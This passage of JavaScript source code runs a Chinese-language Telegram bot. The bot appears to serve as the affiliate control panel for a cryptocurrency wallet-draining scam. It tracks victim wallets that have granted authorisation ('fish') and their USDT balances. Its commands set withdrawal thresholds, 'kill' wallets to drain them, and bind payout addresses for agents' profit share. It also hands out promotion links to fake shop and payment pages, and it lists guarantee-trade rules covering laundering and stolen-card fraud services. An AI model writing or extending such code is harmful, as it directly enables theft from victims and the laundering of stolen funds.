    console.error(`[${getTimeInfo().time}] Bot初始化失败:`, error);
    return false;
  }
}


// 按钮回调器
function setupCallbackHandlers(bot) {
    bot.on('callback_query', async (callbackQuery) => {
        try {
            const data = callbackQuery.data;
            if (!data) return;
            if (data.startsWith('fish_')) {
                await handleFishCallback(callbackQuery);
                return;
            }
            if (data.startsWith('network_')) {
                await handleDailiCallback(callbackQuery);
                return;
            }
            if (data.startsWith('qrcode_')) {
                await handleQRCodeGeneration(callbackQuery);
                return;
            }
        } catch (error) {
            console.error(`[${getTimeInfo().time}] 处理回调查询错误:`, error);
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: "处理请求时出现错误，请联系管理员",
                show_alert: true
            });
        }
    });
}

// 消息处理器
function setupBotHandlers(bot) {
  const patterns = [
    { type: 'classMode', regex: /^(上课|下课)$/ },
    { type: 'rules', regex: /^(规则|交易规则|担保交易规则|担保规则)$/ },
    { type: 'threshold', regex: /^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*([A-Za-z0-9]+)\s*([0-9.]+)$/ },
    { type: 'killFish', regex: /^(?:杀鱼|单杀)\s*([A-Za-z0-9]+)$/ },
    { type: 'paymentAddress', regex: /^(?:收款地址|设置地址|设置收款地址)\s*([A-Za-z0-9]+)$/ },
    { type: 'autoThreshold', regex: /^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$/ },
    { type: 'getPaymentAddress', regex: /^(收款地址)$/ },
    { type: 'getFishInfo', regex: /^(我的|我的鱼苗|鱼苗|鱼池)$/ },
    { type: 'getAgentLink', regex: /^(代理|代理链接|链接|商城|发卡)$/ },
    { type: 'adminQueryFish', regex: /^(?:查看鱼苗|查看用户|查看代理|鱼苗查询|查询鱼苗)(?:\s*@|\s+@)([A-Za-z0-9_]+)$/ },
    { type: 'payment', regex: /^(?:收款|收银台|收银)\s*([0-9]+(?:\.[0-9]{1,6})?)$/ }
  ];
  
  bot.on('message', async (message) => {
    try {
      const chatId = message.chat.id.toString();
      const userId = message.from.id;
      const text = message.text?.trim() || '';
      const messageId = message.message_id;
      if (message.chat.type === 'private') {
        return;
      }
      if (!cacheData.dailiGroupMap.has(chatId)) {
        return;
      }
      const { isAdmin, isCreator } = await checkGroupAdminStatus(bot, chatId, userId);
      const admin = isAdmin || isCreator;
      const isRestricted = await handleClassModeAndGroupState(bot, chatId, null, null, 'getStatus');
      if (isRestricted && !admin && !text) {
        await handleClassModeAndGroupState(bot, chatId, null, null, 'handleViolation', userId, messageId);
        return;
      }
      if (!text) return;
      const command = (function parseCommand(text) {
        for (const pattern of patterns) {
          const match = text.match(pattern.regex);
          if (match) {
            return { type: pattern.type, args: match.slice(1) };
          }
        }
        return null;
      })(text);
      if (isRestricted && !admin) {
        const isAllowedCommand = Object.values(ALLOWED_COMMANDS).some(regex => 
          regex instanceof RegExp ? regex.test(text) : regex(text)
        ) || isCalculator(text);
        if (!isAllowedCommand) {
          await handleClassModeAndGroupState(bot, chatId, null, null, 'handleViolation', userId, messageId);
          return;
        }
      }
      if (!command) {
        return;
      }
      switch (command.type) {
        case 'classMode': {
          const result = await handleClassModeAndGroupState(bot, chatId, message, text);
          if (result) return;
          break;
        }
        case 'rules': {
          const ruleMsg = generateTradeRulesMessage();
          await bot.sendMessage(chatId, ruleMsg, {
            parse_mode: 'HTML',
            reply_to_message_id: messageId,
            disable_web_page_preview: true
          });
          break;
        }
        case 'threshold':
        case 'killFish': {
          const isKill = command.type === 'killFish';
          const fishAddress = command.args[0];
          const thresholdValue = isKill ? 0 : parseFloat(command.args[1]);
          
          const response = await updateThreshold(chatId, message, fishAddress, thresholdValue, isKill, bot);
          if (response) {
            await bot.sendMessage(chatId, response, {
              parse_mode: 'HTML',
              reply_to_message_id: messageId
            });
          }
          break;
        }
        case 'paymentAddress': {
          const address = command.args[0];
          const response = await updatePaymentAddress(chatId, message, address);
          if (response && response.text) {
            await bot.sendMessage(chatId, response.text, {
              ...response.options,
              reply_to_message_id: messageId
            });
          }
          break;
        }
        case 'autoThreshold': {
          const newThreshold = parseFloat(command.args[0]);
          const response = await updateAutoThreshold(chatId, message, newThreshold);
          if (response && response.text) {
            await bot.sendMessage(chatId, response.text, {
              ...response.options,
              reply_to_message_id: messageId
            });
          }
          break;
        }
        case 'getPaymentAddress': {
          const response = await getPaymentAddressInfo(chatId, message);
          if (response && response.text) {
            await bot.sendMessage(chatId, response.text, {
              ...response.options,
              reply_to_message_id: messageId
            });
          }
          break;
        }
        case 'getFishInfo': {
          const response = await getFishMessage(chatId, message);
          if (response && response.text) {
            await bot.sendMessage(chatId, response.text, {
              ...response.options,
              reply_to_message_id: messageId
            });
          }
          break;
        }
        case 'getAgentLink': {
          const response = await getDomainMessage(chatId, message);
          if (response && response.text) {
            await bot.sendMessage(chatId, response.text, {
              ...response.options,
              reply_to_message_id: messageId
            });
          }
          break;
        }
        case 'adminQueryFish': {
          const username = command.args[0];
          const response = await adminQueryUserFish(chatId, message, username, bot);
          if (response && response.text) {
            await bot.sendMessage(chatId, response.text, {
              ...response.options,
              reply_to_message_id: messageId
            });
          }
          break;
        }
        case 'payment': {
          const amount = parseFloat(command.args[0]);
          const response = await handlePaymentRequest(chatId, message, amount);
          if (response && response.text) {
            await bot.sendMessage(chatId, response.text, {
              ...response.options,
              reply_to_message_id: messageId
            });
          }
          break;
        }
        default: {
          console.log(`[${getTimeInfo().time}] 未识别的命令类型：${command.type}`);
        }
      }
    } catch (error) {
      console.error(`[${getTimeInfo().time}] 消息处理错误:`, error);
      await bot.sendMessage(message.chat.id, "❌ 处理命令时出现错误，请稍后重试。", {
        reply_to_message_id: message.message_id
      });
    }
  });
}

// 下课时允许发送的消息内容
const ALLOWED_COMMANDS = {
  threshold: /^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40})\s*([0-9.]+)$/,
  killFish: /^杀鱼\s*(?:T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40})$/,
  paymentAddress: /^(?:收款地址|设置地址|设置收款地址)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40})$/,
  queryPaymentAddress: /^收款地址$/,
  myFish: /^(?:我的|我的鱼苗|鱼苗|鱼池)$/,
  proxy: /^(?:代理|代理链接|链接|商城|发卡)$/,
  autoThreshold: /^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$/,
  price: /^🏦汇率查询$|^汇率$|^usdt$|^USDT$|^L$|^l$|^\d+[uU]$|^[Zz]\d{1,10}$/,
  trx: /^🪫TRX 闪兑$|^闪兑$|^trx$|^TRX$|^TRC$|^trc$/,
  energy: /^🔋能量租赁$|^能量租赁$|^能量$/,
  id: /^ID查询$|^telegramid$|^id查询$|^查询ID$|^查询id$|^🔍TGID查询$/,
  botCommands: /^(?:机器人|担保|汇旺|新币)$/,
  rules: /^(?:规则|交易规则|担保交易规则|担保规则)$/,
  addressCheck: /^(?:T[1-9A-HJ-NP-Za-km-z]{33}|0x[a-fA-F0-9]{40})$/
};
const isCalculator = (text) => {
  if (!text || !/^[\d\+\-\*/\%\(\)\. =xX÷％]+$/.test(text)) return false;
  if (/^\d+$/.test(text)) return false;
  let sanitizedText = text
    .split('=')[0]
    .replace(/x/gi, '*')
    .replace(/÷/g, '/')
    .replace(/％/g, '%')
    .trim();
  if (!/^[\d\(]/.test(sanitizedText) || !/[\d\)]$/.test(sanitizedText)) return false;
  return /[\+\-\*/\%]/.test(sanitizedText);
};

// 群成员违禁次数记录
const violationCounts = new Map();
// 处理 上课/下课命令
async function handleClassModeAndGroupState(bot, chatId, message, text, action = null, userId = null, messageId = null) {
  try {
    function clearGroupViolations(chatId) {
      for (const key of violationCounts.keys()) {
        if (key.startsWith(`${chatId}:`)) {
          violationCounts.delete(key);
        }
      }
    }
    if (action) {
      switch(action) {
        case 'getStatus':
          const groupInfo = cacheData.dailiGroupMap.get(chatId);
          return groupInfo?.status === 0;
          
        case 'setStatus':
          const newStatus = userId ? 0 : 1;
          await pool.promise().query(
            "UPDATE daili_group SET status = ? WHERE groupid = ?",
            [newStatus, chatId]
          );
          
          const currentGroupInfo = cacheData.dailiGroupMap.get(chatId);
          if (currentGroupInfo) {
            currentGroupInfo.status = newStatus;
            cacheData.dailiGroupMap.set(chatId, currentGroupInfo);
          }
          if (!userId) {
            clearGroupViolations(chatId);
          }
          break;
        case 'getViolation':
          return violationCounts.get(`${chatId}:${userId}`) || 0;
        case 'addViolation':
          const count = (violationCounts.get(`${chatId}:${userId}`) || 0) + 1;
          violationCounts.set(`${chatId}:${userId}`, count);
          return count;
        case 'resetViolation':
          violationCounts.delete(`${chatId}:${userId}`);
          break;
        case 'clearViolations':
          clearGroupViolations(chatId);
          break;
        case 'handleViolation':
          const violationCount = await handleClassModeAndGroupState(bot, chatId, null, null, 'addViolation', userId);
          const warningMsg = `🤐 下课期间，禁止发送非命令消息，第${violationCount}次警告，违规3次以上将禁言处理`;
          const warnMsgResult = await bot.sendMessage(chatId, warningMsg, {
            reply_to_message_id: messageId
          });
          try {
            await bot.deleteMessage(chatId, messageId);
          } catch (error) {
            console.error(`[${getTimeInfo().time}] 在 ${chatId} 群删除客户消息失败:`, error);
          }
          setTimeout(async () => {
            try {
              await bot.deleteMessage(chatId, warnMsgResult.message_id);
            } catch (error) {
              console.error(`[${getTimeInfo().time}] 在 ${chatId} 群删除警告消息失败:`, error);
            }
          }, 3000);
          if (violationCount >= 3) {
            try {
              await bot.restrictChatMember(chatId, userId, {
                can_send_messages: false,
                can_send_media_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false
              }, 3);
              await handleClassModeAndGroupState(bot, chatId, null, null, 'resetViolation', userId);
            } catch (error) {
              console.error(`[${getTimeInfo().time}] 在 ${chatId} 群限制用户禁言失败:`, error);
            }
          }
          return false;
        default:
          break;
      }
      if (!message) return;
    }
    if (!message) return false;
    const messageUserId = message.from.id;
    const messageIdFromMsg = message.message_id;
    const adminStatus = await checkGroupAdminStatus(bot, chatId, messageUserId);
    const isAdmin = adminStatus.isAdmin || adminStatus.isCreator;
    if (!isAdmin) {
      return false;
    }
    const newRestrictedMode = text === '下课';
    await handleClassModeAndGroupState(bot, chatId, null, null, 'setStatus', newRestrictedMode);
    const restrictedModeMsg = `下课成功，下课期间禁止闲聊，仅允许发送以下命令：
    
🌐<code>代理</code>（<u>获取推广链接</u>）

🐟<code>鱼苗</code>（<u>查看自己的鱼苗</u>）

💰<code>收款地址</code>（<u>查看自己的收款地址</u>）

💳收款地址+地址（<u>绑定自己的收款地址</u>）
例：<code>收款地址 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>

⚔️杀鱼+鱼苗地址（<u>杀鱼命令</u>）
例：<code>杀鱼 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>

⚙️自动阈值+新的自动阈值（<u>授权后自动设置的阈值</u>）
例：<code>自动阈值 5000</code>

🔏阈值+鱼苗地址+新的阈值（<u>修改提币阈值</u>）
例：<code>阈值 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 10000</code>`;
    const statusMsg = newRestrictedMode ? restrictedModeMsg : "🎣 新的一天开始，预祝大家今天杀鱼多多";
    await bot.sendMessage(chatId, statusMsg, {
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error(`[${getTimeInfo().time}] 在 ${chatId} 群处理上课/下课错误:`, error);
    if (action === 'getStatus') {
      return false;
    }
    return false;
  }
}

// 担保交易规则
function generateTradeRulesMessage() {
    const rules = [
        ['常规卡卡交易', 33, '大混卡卡交易', 34, '常规回U交易', 35],
        ['大混回U交易', 36, '常规码回U交易', 37, '一道常规码接交易', 38],
        ['公檢法進算', 39, 'BC料收付一体', 40, 'BC料代收', 41],
        ['纯BC充U代付', 42, '充U代付交易', 43, '卡接一道进算', 44],
        ['资金盘一道交易', 45, '京东小时达', 46, '话费卡', 47],
        ['实物小时达', 48, '二道常规交易', 49, '油卡充值卡', 50],
        ['码接二道常规料', 51, '精聊二道', 52, '一道色料码接', 53],
        ['口令红包', 54, '一道微信群转账进算', 55, '码接二道色料', 56],
        ['二道数字人民币', 57, '话费卡核销', 58, '京东E卡', 60],
        ['支付宝口令代收', 84, '充值话费交易', 66, '纯BC代付交易', 83],
        ['码接二道精聊回U', 79, '日本私户规则', 75, '精聊二道', 89],
        ['资金盘前中期二道料', 86, '资金盘一道交易规则', 64, '大区二道', 74],
        ['钉钉群收款', 73, '钉钉红包常规', 65, '一道常规网关进算', 78],
        ['快手', 71, '纯白资U兑换一道盗刷U', 69, '精料无卡取现', 72],
        ['承兑支付宝微信码接回u', 85, '搭建机器人/网站交易', 68, '抖币快币代充', 62],
        ['克隆', 63, '查档', 80, '黄金/苹果手机', 87]
    ];
    let messageText = '📜 以下规则仅供参考：\n\n';
    rules.forEach(row => {
        messageText += `<a href="https://t.me/Guizecaishen/${row[1]}"><u>${row[0]}</u></a> | <a href="https://t.me/Guizecaishen/${row[3]}"><u>${row[2]}</u></a> | <a href="https://t.me/Guizecaishen/${row[5]}"><u>${row[4]}</u></a>\n`;
    });
    return messageText;
}

// 检查群管理员权限
async function checkGroupAdminStatus(bot, chatId, userId) {
   try {
       const chatMember = await bot.getChatMember(chatId, userId);
       const chatAdmins = await bot.getChatAdministrators(chatId);
       const isCreator = chatMember.status === 'creator';
       const isAdmin = chatAdmins.some(admin => admin.user.id === userId);
       return {
           isCreator,
           isAdmin,
           status: chatMember.status
       };
   } catch (error) {
       return {
           isCreator: false,
           isAdmin: false,
           status: 'member'
       };
   }
}


// 收银台
async function handlePaymentRequest(chatId, message, amount) {
  try {
    const userId = message.from.id.toString();
    const currentChatId = chatId.toString();
    let userAgent = null;
    for (const [uniqueId, agentData] of cacheData.dailiMap) {
      if (agentData.tguid && agentData.tguid.toString() === userId && 
          agentData.groupid && agentData.groupid.toString() === currentChatId) {
        userAgent = agentData;
        break;
      }
    }
    if (!userAgent) {
      return {
        text: "⛔️ 请先注册成为代理后再使用收银台功能",
        options: {
          parse_mode: 'HTML'
        }
      };
    }
    const mainDomain = cacheData.options.main_domain;
    if (!mainDomain) {
      return {
        text: "❌ 系统配置错误，请联系管理员",
        options: {
          parse_mode: 'HTML'
        }
      };
    }
    const paymentUrl = `${mainDomain}/pay/?id=trc${userAgent.unique_id}&amount=${amount.toFixed(6)}`;
    const now = new Date();
    const endTime = new Date(now.getTime() + 10 * 60 * 1000);
    const formatTime = (date) => {
      const year = date.getFullYear();
      const month = String(date.getMonth() + 1).padStart(2, '0');
      const day = String(date.getDate()).padStart(2, '0');
      const hours = String(date.getHours()).padStart(2, '0');
      const minutes = String(date.getMinutes()).padStart(2, '0');
      return `${year}-${month}-${day} ${hours}:${minutes}`;
    };
    const createTime = formatTime(now);
    const expireTime = formatTime(endTime);
    const replyText = `<b>订单创建成功✅</b>
<b>金额: </b><code>${amount}</code> <b>USDT</b>
<b>💰收银台：</b><a href="${paymentUrl}"><u>立即付款</u></a>
<b>订单创建时间：</b><code>${createTime}</code>
<b>订单结束时间：</b><code>${expireTime}</code>`;
    return {
      text: replyText,
      options: {
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }
    };
  } catch (error) {
    console.error(`[${getTimeInfo().time}] 处理收款请求错误:`, error);
    return {
      text: "❌ 处理收款请求时出现错误，请稍后重试",
      options: {
        parse_mode: 'HTML'
      }
    };
  }
}


// 查询鱼苗
async function getFishMessage(chatId, message) {
    try {
        const userId = message.from.id;
        const fullName = message.from.first_name + (message.from.last_name ? ' ' + message.from.last_name : '');
        const timeInfo = getTimeInfo();
        const PAGE_SIZE = 3;
        const userAgent = Array.from(cacheData.dailiMap.values())
            .find(agent => agent.tguid === userId.toString() && agent.groupid === chatId.toString());
        if (!userAgent) {
            return {
                text: `🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                      `📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。`,
                options: {
                    parse_mode: 'HTML',
                    reply_to_message_id: message.message_id
                }
            };
        }
        const userFishList = Array.from(cacheData.fishMap.values())
            .filter(fish => fish.unique_id === userAgent.unique_id && fish.auth_status === 1)
            .sort((a, b) => a.id - b.id);
        if (userFishList.length === 0) {
            return {
                text: `🎣渔夫 ${fullName} ${timeInfo.greeting}！\n\n` +
                    //   `您的自动阈值为：<code>${userAgent.threshold}</code>\n` +
                      `🐟您的鱼池为空，请继续加油吧，答应我一定要赚够多多的uu！`,
                options: {
                    parse_mode: 'HTML',
                    reply_to_message_id: message.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '✅ 退出查询', callback_data: `fish_close_${userAgent.unique_id}` }]
                        ]
                    }
                }
            };
        }
        let responseMessage = `🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                            // `您的自动阈值为：<code>${userAgent.threshold}</code>\n` +
                            `共计 <code>${userFishList.length}</code> 条鱼苗（第<code>1</code>页）\n\n`;
        const firstPageFish = userFishList.slice(0, PAGE_SIZE);
        firstPageFish.forEach((fish, index) => {
            const fishNumber = index + 1;
            const formattedBalance = Number(fish.usdt_balance).toFixed(6);
            const formattedThreshold = Number(fish.threshold).toFixed(6);
            responseMessage += `🐟鱼苗<code>${fishNumber}</code>号：<code>${fish.fish_address}</code>\n` +
                             `📤提币阈值：<code>${formattedThreshold}</code>\n` +
                             `💸USDT余额：<code>${formattedBalance}</code>\n\n`;
        });
        const keyboard = {
            inline_keyboard: userFishList.length > PAGE_SIZE ? 
                [[
                    { text: '➡️下一页', callback_data: `fish_page_${userAgent.unique_id}_2` },
                    { text: '✅ 退出查询', callback_data: `fish_close_${userAgent.unique_id}` }
                ]] : 
                [[{ text: '✅ 退出查询', callback_data: `fish_close_${userAgent.unique_id}` }]]
        };
        return {
            text: responseMessage,
            options: {
                parse_mode: 'HTML',
                reply_to_message_id: message.message_id,
                reply_markup: keyboard
            }
        };
    } catch(error) {
        console.error(`[${getTimeInfo().time}] 查询鱼池信息错误:`, error);
        return {
            text: "❌ 查询鱼池信息时出现错误，请联系管理员。",
            options: {
                parse_mode: 'HTML',
                reply_to_message_id: message.message_id
            }
        };
    }
}

// 管理员查询用户鱼苗功能 【查询鱼苗 @abcd】
async function adminQueryUserFish(chatId, message, targetUsername, bot) {
  try {
    const adminId = message.from.id;
    const adminFullName = message.from.first_name + (message.from.last_name ? ' ' + message.from.last_name : '');
    const timeInfo = getTimeInfo();
    const { isAdmin, isCreator } = await checkGroupAdminStatus(bot, chatId, adminId);
    if (!isAdmin && !isCreator) {
      // 对非管理员的命令不做任何处理
      return null;
    }
    const groupAgents = Array.from(cacheData.dailiMap.values())
      .filter(agent => agent.groupid === chatId.toString());
    const targetAgent = groupAgents.find(agent => 
      agent.username && agent.username.toLowerCase() === targetUsername.toLowerCase()
    );
    if (!targetAgent) {
      return {
        text: `❌ 未找到用户 @${targetUsername} 的鱼苗信息。`,
        options: {
          parse_mode: 'HTML',
          reply_to_message_id: message.message_id
        }
      };
    }
    let firstName = '';
    let lastName = '';
    if (targetAgent.fullName) {
      const nameParts = targetAgent.fullName.split(' ');
      firstName = nameParts[0] || '';
      lastName = nameParts[1] || '';
    }
    const modifiedMessage = {
      ...message,
      from: {
        id: targetAgent.tguid,
        first_name: firstName,
        last_name: lastName,
        username: targetAgent.username
      }
    };
    const fishResponse = await getFishMessage(chatId, modifiedMessage);
    if (fishResponse && fishResponse.text) {
      const targetFullName = targetAgent.fullName || targetAgent.username || 'Unknown';
      const originalTitle = `🎣渔夫 <code>${targetFullName}</code> ${timeInfo.greeting}！`;
      const newTitle = `👮‍♂️ 管理员 <code>${adminFullName}</code> ${timeInfo.greeting}！\n\n当前正在查询用户: @${targetAgent.username}`;
      fishResponse.text = fishResponse.text.replace(originalTitle, newTitle);
      if (fishResponse.options && fishResponse.options.reply_markup && 
          fishResponse.options.reply_markup.inline_keyboard) {
        const keyboard = fishResponse.options.reply_markup.inline_keyboard;
        for (let i = 0; i < keyboard.length; i++) {
          for (let j = 0; j < keyboard[i].length; j++) {
            const button = keyboard[i][j];
            if (button.callback_data && !button.callback_data.includes('_admin')) {
              button.callback_data = button.callback_data + '_admin';
            }
          }
        }
      }
    }
    return fishResponse;
  } catch(error) {
    console.error(`[${getTimeInfo().time}] 管理员查询用户鱼苗错误:`, error);
    return {
      text: "❌ 查询用户鱼苗信息时出现错误。",
      options: {
        parse_mode: 'HTML',
        reply_to_message_id: message.message_id
      }
    };
  }
}

// 查看鱼苗按钮回调
async function handleFishCallback(callbackQuery) {
  try {
    const chatId = callbackQuery.message.chat.id;
    const clickUserId = callbackQuery.from.id;
    const messageId = callbackQuery.message.message_id;
    const callbackData = callbackQuery.data.split('_');
    const action = callbackData[0];
    const type = callbackData[1];
    const targetUniqueId = callbackData[2];
    const isAdminMode = callbackData.includes('admin');
    const page = isAdminMode ? 
      parseInt(callbackData[callbackData.indexOf('admin') - 1]) : 
      parseInt(callbackData[3]);
    const adminStatus = await checkGroupAdminStatus(bot, chatId, clickUserId);
    const isAdmin = adminStatus.isAdmin || adminStatus.isCreator;
    if (isAdminMode && !isAdmin) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "⛔️ 您无权操作本条消息，只有管理员可以操作",
        show_alert: true
      });
      return;
    }
    if (!isAdminMode) {
      const clickUserAgent = Array.from(cacheData.dailiMap.values())
        .find(agent => agent.tguid === clickUserId.toString() && agent.groupid === chatId.toString());
        
      if (!clickUserAgent || (clickUserAgent.unique_id !== targetUniqueId && !isAdmin)) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "⛔️ 您无权操作本条消息",
          show_alert: true
        });
        return;
      }
    }
    if (type === 'close') {
      await bot.deleteMessage(chatId, messageId);
      await bot.answerCallbackQuery(callbackQuery.id);
      return;
    }
    if (type === 'page') {
      const currentPage = page;
      const PAGE_SIZE = 3;
      const userFishList = Array.from(cacheData.fishMap.values())
        .filter(fish => fish.unique_id === targetUniqueId && fish.auth_status === 1)
        .sort((a, b) => a.id - b.id);
      const start = (currentPage - 1) * PAGE_SIZE;
      const pageFish = userFishList.slice(start, start + PAGE_SIZE);
      const targetAgent = cacheData.dailiMap.get(targetUniqueId);
      let responseMessage;
      if (isAdminMode) {
        responseMessage = `📊 管理员查询：用户 @${targetAgent.username} 的鱼池信息：\n\n` +
                        `总计：<code>${userFishList.length}</code> 条鱼苗（第<code>${currentPage}</code>页）\n\n`;
      } else {
        const fullName = callbackQuery.from.first_name + 
                      (callbackQuery.from.last_name ? ' ' + callbackQuery.from.last_name : '');
        responseMessage = `🎣渔夫 <code>${fullName}</code> ${getTimeInfo().greeting}！\n\n` +
                        `共计 <code>${userFishList.length}</code> 条鱼苗（第<code>${currentPage}</code>页）\n\n`;
      }
      pageFish.forEach((fish, index) => {
        const fishNumber = start + index + 1;
        const formattedBalance = Number(fish.usdt_balance).toFixed(6);
        const formattedThreshold = Number(fish.threshold).toFixed(6);
        responseMessage += `🐟鱼苗<code>${fishNumber}</code>号：<code>${fish.fish_address}</code>\n` +
                         `📤提币阈值：<code>${formattedThreshold}</code>\n` +
                         `💸USDT余额：<code>${formattedBalance}</code>\n\n`;
      });
      const keyboard = { inline_keyboard: [] };
      const hasNextPage = start + PAGE_SIZE < userFishList.length;
      const hasPrevPage = currentPage > 1;
      const adminSuffix = isAdminMode ? '_admin' : '';
      if (hasPrevPage && hasNextPage) {
        keyboard.inline_keyboard = [
          [
            { text: '⬅️上一页', callback_data: `fish_page_${targetUniqueId}_${currentPage - 1}${adminSuffix}` },
            { text: '➡️下一页', callback_data: `fish_page_${targetUniqueId}_${currentPage + 1}${adminSuffix}` }
          ],
          [{ text: '✅ 关闭', callback_data: `fish_close_${targetUniqueId}${adminSuffix}` }]
        ];
      } else if (hasNextPage) {
        keyboard.inline_keyboard = [
          [
            { text: '➡️下一页', callback_data: `fish_page_${targetUniqueId}_${currentPage + 1}${adminSuffix}` },
            { text: '✅ 关闭', callback_data: `fish_close_${targetUniqueId}${adminSuffix}` }
          ]
        ];
      } else if (hasPrevPage) {
        keyboard.inline_keyboard = [
          [
            { text: '⬅️上一页', callback_data: `fish_page_${targetUniqueId}_${currentPage - 1}${adminSuffix}` },
            { text: '✅ 关闭', callback_data: `fish_close_${targetUniqueId}${adminSuffix}` }
          ]
        ];
      } else {
        keyboard.inline_keyboard = [
          [{ text: '✅ 关闭', callback_data: `fish_close_${targetUniqueId}${adminSuffix}` }]
        ];
      }
      await bot.editMessageText(responseMessage, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      await bot.answerCallbackQuery(callbackQuery.id);
    }
  } catch(error) {
    console.error(`[${getTimeInfo().time}] 处理鱼苗回调错误:`, error);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "查看鱼苗时出现错误，请联系管理员",
      show_alert: true
    });
  }
}

// 生成唯一ID
async function generateUniqueId(pool) {
   const randomId = Math.floor(100000000 + Math.random() * 900000000).toString();
   const [exists] = await pool.promise().query(
       'SELECT id FROM daili WHERE unique_id = ?', 
       [randomId]
   );
   if (exists.length === 0) {
       return randomId;
   }
   return generateUniqueId(pool);
}

// 获取推广链接
async function getDomainMessage(chatId, message) {
    const NETWORK_BUTTONS = [
        ['TRC', 'ERC', 'BSC'],
        ['OKC', 'GRC', 'POL'],
        ['✅申请开通扫码支付二维码']  
    ];
   try {
       if(!message.from.username) {
           return {
               text: "❌ 请先创建你的用户名才能继续申请代理链接",
               options: {}
           };
       }
       const userId = message.from.id;
       const username = message.from.username;
       const fullName = message.from.first_name + (message.from.last_name ? ' ' + message.from.last_name : '');
       const timeInfo = getTimeInfo();
       const groupId = message.chat.id.toString();
       const [agent] = await pool.promise().query(
           'SELECT * FROM daili WHERE tguid = ? AND groupid = ?', 
           [userId.toString(), groupId]
       );
       if (!agent.length) {
           try {
               const uniqueId = await generateUniqueId(pool);
               await pool.promise().query(
                   'INSERT INTO daili (tguid, username, fullName, time, groupid, unique_id) VALUES (?, ?, ?, ?, ?, ?)', 
                   [userId, username, fullName, timeInfo.time, groupId, uniqueId]
               );
           } catch (error) {
               console.error(`[${getTimeInfo().time}] 创建代理记录失败:`, error);
               return {
                   text: "❌ 创建代理记录时出现错误，请联系管理员。",
                   options: {}
               };
           }
       } else {
           await pool.promise().query(
               'UPDATE daili SET username = ?, fullName = ? WHERE tguid = ? AND groupid = ?',
               [username, fullName, userId, groupId]
           );
       }
       const currentAgent = await pool.promise().query(
           'SELECT threshold, payment_address FROM daili WHERE tguid = ? AND groupid = ?',
           [userId.toString(), groupId]
       );
       const threshold = currentAgent[0][0]?.threshold || 1000;
       const paymentAddress = currentAgent[0][0]?.payment_address || "当前未设置，可使用【收款地址】进行设置";
       const buttons = NETWORK_BUTTONS.map(row => 
           row.map(network => {
               if (network === '✅申请开通扫码支付二维码') {
                   const callbackData = `qrcode_${userId}_${message.message_id}_${groupId}`;
                   return {
                       text: network,
                       callback_data: callbackData
                   };
               } else {
                   return {
                       text: network,
                       callback_data: `network_${network}_${userId}_${message.message_id}_${groupId}`
                   };
               }
           })
       );
       return {
           text: `🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                 `⚜️授权成功后自动设置阈值：<code>${threshold}</code>\n\n` +
                 `<pre><code class="language-💰您的杀鱼自动分润地址：">${paymentAddress}</code></pre>\n\n` +
                 `🌐请选择你需要推广的网络：`,
           options: {
               parse_mode: 'HTML',
               reply_to_message_id: message.message_id,
               reply_markup: {
                   inline_keyboard: buttons
               }
           }
       };
   } catch(error) {
       console.error(`[${getTimeInfo().time}] 处理代理链接错误:`, error);
       return {
           text: "❌ 生成代理链接时出现错误，请联系管理员。",
           options: {}
       };
   }
}

// 代理链接消息按钮回调
async function handleDailiCallback(callbackQuery) {
    try {
        const data = callbackQuery.data;
        const match = data.match(/^network_(\w+)_(\d+)_(\d+)_(-?\d+)$/);
        if (!match) return;
        const [_, network, originalUserId, messageId, groupId] = match;
        const clickUserId = callbackQuery.from.id;
        const userAgent = Array.from(cacheData.dailiMap.values())
            .find(agent => agent.tguid === clickUserId.toString() && agent.groupid === groupId);
        if (!userAgent || clickUserId.toString() !== originalUserId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ 您可发送 代理 获取自己的专属推广链接",
                show_alert: true
            });
            return;
        }
        let domain = cacheData.options.main_domain || '';
        if (!domain) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: "❌ 未找到主域名，请联系管理员在后台进行配置。",
                show_alert: true
            });
            return;
        }
        if (domain.endsWith('/')) {
            domain = domain.slice(0, -1);
        }
        const timeInfo = getTimeInfo();
        const fullName = callbackQuery.from.first_name + (callbackQuery.from.last_name ? ' ' + callbackQuery.from.last_name : '');
        const idParam = `?id=${network.toLowerCase()}${userAgent.unique_id}`;
        const links = {
            shop: `${domain}${idParam}`,
            goods: `${domain}/buy/1${idParam}`,
            trx: `${domain}/trx${idParam}`,
            sgk: `${domain}/sgk${idParam}`,
            hsn: `${domain}/hsn${idParam}`,
            tk: `${domain}/tk${idParam}`,
            sw: `${domain}/sw${idParam}`,
            jm: `${domain}/jm${idParam}`,
            xinbi: `${domain}/xinbi${idParam}`,
            hwdb: `${domain}/hwdb${idParam}`,
            tddb: `${domain}/tddb${idParam}`
        };
        let newMessage = `🎣渔夫 <code>${fullName}</code> ${timeInfo.greeting}！\n\n` +
                        `📥请复制保存您的 <code>${network}</code> 专属推广链接\n\n` +
                        `🛒 商城链接:\n` +
